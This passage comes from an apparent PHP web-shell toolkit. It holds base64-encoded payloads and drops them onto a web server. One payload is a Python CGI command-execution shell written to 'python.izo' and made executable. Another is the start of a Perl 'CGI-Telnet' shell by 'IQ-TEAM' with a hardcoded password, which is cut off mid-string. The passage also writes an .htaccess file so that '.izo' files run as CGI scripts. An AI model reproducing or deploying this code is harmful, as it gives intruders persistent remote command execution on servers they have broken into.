cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("python.izo",0755);
echo"<p></p>";
  echo "<center><br><b><a href=python/python.izo target='_blank'><div><span style=color:#6ebe0b;font-family:Arial;font-size:11px;>Python SH3ll </span></div></a></b></center>";
echo "<iframe src=python/python.izo width=100% height=40% ></iframe> ";
	
        
        break;
        case'cgi1':
        
        mkdir('cgi4e', 0755);
chdir('cgi4e');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Cannot Create The File!");
$metin = "AddType application/x-httpd-cgi .izo
AddType application/x-httpd-cgi .izo

AddHandler cgi-script .izo
AddHandler cgi-script .izo";    
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$cgi4e = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS40IjsNCiRFZGl0UGVyc2lvbj0iSVEtVEVBTSI7DQoNCiRQYXNzd29yZCA9ICJpcXRlYW0iOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KCQkJCSMgdG8gbG9naW4uDQpzdWIgSXNfV2luKCl7DQoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOw0KCWlmKCRvcyA9fiBtL3dpbi9pKXsNCgkJcmV0dXJuIDE7DQoJfWVsc2V7DQoJCXJldHVybiAwOw0KCX0NCn0NCiRXaW5OVCA9ICZJc19XaW4oKTsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4NCg0KJFVuaXhDbWRTZXAgPSAiOyI7CQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOwkJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQNCgkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuDQoJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQ0KCQkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQNCgkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlDQoJCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KJGNvbHM9IDEzMDsNCiRyb3dzPSAyNjsNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBmdW5jdGlvbiBFbmNvZGVEaXI6IGVuY29kZSBiYXNlNjQgUGF0aA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEVuY29kZURpcg0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCgkkZGlyID0gdHJpbShlbmNvZGVfYmFzZTY0KCRkaXIpKTsNCgkkZGlyID1+IHMvKFxyfFxuKS8vOw0KCXJldHVybiAkZGlyOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkaWQgPSBgaWRgIGlmKCEkV2luTlQpOw0KCW15ICRpbmZvID0gYHVuYW1lIC1zIC1uIC1yIC1pYDsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQo8dGl0bGU+Q2dpLVRlbG5ldCBbICRWZXJzaW9uIF08L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZmY7DQp9DQp0cix0ZCx0YWJsZSxpbnB1dCx0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCn0NCiNkb21haW4gdHI6aG92ZXJ7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjNDQ0Ow0KfQ0KdGQgew0KY29sb3I6ICMyQkE4RUM7DQp9DQoubGlzdGRpciB0ZHsNCgl0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQoubGlzdGRpciB0aHsNCgljb2xvcjogI0ZGOTkwMDsNCn0NCi5kaXIsLmZpbGUNCnsNCgl0ZXh0LWFsaWduOiBsZWZ0ICFpbXBvcnRhbnQ7DQp9DQouZGlyew0KCWZvbnQtc2l6ZTogMTBwdDsgDQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQp0YWJsZSB7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMTExOw0KfQ0KaW5wdXQgew0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCmNvZGUgew0KYm9yZGVyOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogd2hpbGU7DQp9DQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogI0ZGMDBBQTsNCn0NCnRleHRhcmVhIHsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCi5saXN0ZGlyIHRyOmhvdmVyew0KCWJhY2tncm91bmQ6ICM0NDQ7DQp9DQoubGlzdGRpciB0cjpob3ZlciB0ZHsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOw0KfQ0KLm5vdGxpbmV7DQoJYmFja2dyb3VuZDogIzExMTsNCn0NCi5saW5lew0KCWJhY2tncm91bmQ6ICMyMjI7DQp9DQo8L3N0eWxlPg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQpmdW5jdGlvbiBFbmNvZGVyKG5hbWUpDQp7DQoJdmFyIGUgPSAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQobmFtZSk7DQoJZS52YWx1ZSA9IGJ0b2EoZS52YWx1ZSk7DQoJcmV0dXJuIHRydWU7DQp9DQpmdW5jdGlvbiBjaG1vZF9mb3JtKGksZmlsZSkNCnsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkNCnsNCglyZXNwb25zZS5pbm5lckhUTUwgPSAiPHNwYW4gb25jbGljaz1cXFwiY2htb2RfZm9ybSgiICsgaSArICIsJyIrIGZpbGUrICInKVxcXCIgPiIrIHBlcm1zICsiPC9zcGFuPjwvdGQ+IjsNCn0NCmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOw0KCXZhciBiYWNrPSJybV9yZW5hbWVfZm9ybSgiK2krIixcXFwiIitmaWxlKyJcXFwiLFxcXCIiK2YrIlxcXCIpOyByZXR1cm4gZmFsc2U7IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScnIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJEVuY29kZUN1cnJlbnREaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX3JlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWlmKGY9PSdmJykNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1